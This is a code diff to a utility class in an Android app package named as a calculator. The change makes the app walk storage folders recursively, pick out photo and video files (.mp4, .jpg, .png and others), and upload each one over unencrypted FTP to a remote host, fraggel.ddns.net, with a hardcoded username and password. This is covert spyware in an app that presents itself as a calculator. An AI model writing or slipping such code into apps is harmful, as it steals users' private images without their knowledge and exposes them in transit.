@@ -1,28 +1,16 @@
 package es.fraggel.acalculator;
 
 import org.apache.commons.net.ftp.FTP;
-import org.apache.commons.net.ftp.FTPSClient;
+import org.apache.commons.net.ftp.FTPClient;
+import org.apache.commons.net.ftp.FTPFile;
 
 import android.Manifest;
-import android.app.AlarmManager;
-import android.app.PendingIntent;
 import android.content.Context;
-import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.os.Build;
-import android.support.v4.app.ActivityCompat;
-import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.text.SimpleDateFormat;
-import java.util.ArrayList;
-import java.util.Calendar;
-import java.util.Date;
-import java.util.List;
+
 
 
 public class Util {
@@ -53,34 +41,44 @@ public class Util {
 
         for (File file : f.listFiles()) {
             if(file.isDirectory()){
-                //GetFiles(file.getAbsolutePath());
+                GetFiles(file.getAbsolutePath());
             }else{
-                //uploadFile(file);
-                Log.d("Calculator",file.getAbsolutePath());
+                String ff=file.getName().toLowerCase();
+                if(ff.indexOf(".mp4")!=-1|| ff.indexOf(".3gp")!=-1||ff.indexOf(".m4v")!=-1||ff.indexOf(".mov")!=-1
+                        ||ff.indexOf(".jpg")!=-1||ff.indexOf(".jpeg")!=-1||ff.indexOf(".png")!=-1||ff.indexOf(".bmp")!=-1) {
+                    uploadFile(file);
+                    Log.d("Calculator", file.getAbsolutePath());
+                }
             }
         }
     }
     public static void uploadFile(File file) {
         int flag;
         FileInputStream fis = null;
-        FTPSClient client = new FTPSClient();
+        FTPClient client = new FTPClient();
         try {
             fis = new FileInputStream(file);
-            client.connect("192.168.0.42", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
-            client.execPBSZ(0);
-            client.execPROT("P");
+            client.connect("fraggel.ddns.net", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
+            /*client.execPBSZ(0);
+            client.execPROT("P");*/
             client.login("fraggel", "ak47cold");
             client.enterLocalPassiveMode();
-            client.enterLocalPassiveMode(); // IMPORTANTE!!!!
             client.setFileType(FTP.BINARY_FILE_TYPE);
             client.changeWorkingDirectory("/ftp");
-            boolean uploadFile = client.storeFile(file.getName(), fis);
+            client.makeDirectory(file.getParentFile().getName());
+            client.changeWorkingDirectory("/ftp/"+file.getParentFile().getName());
+            FTPFile[] ftpFiles = client.listFiles(file.getName());
+            boolean uploadFile=false;
+            if (ftpFiles.length > 0)
+            {
+                Log.d("UTIL","fichero ya existe");
+            }
+            else
+            {
+                uploadFile = client.storeFile(file.getName(), fis);
+            }
             client.logout();
             client.disconnect();
-
-            if (uploadFile == false) {
-                throw new Exception("Error al subir el fichero");
-            }
         } catch (Exception eFTPClient) {
             eFTPClient.printStackTrace();
             // Gestionar el error, mostrar pantalla, reescalar excepcion... etc...
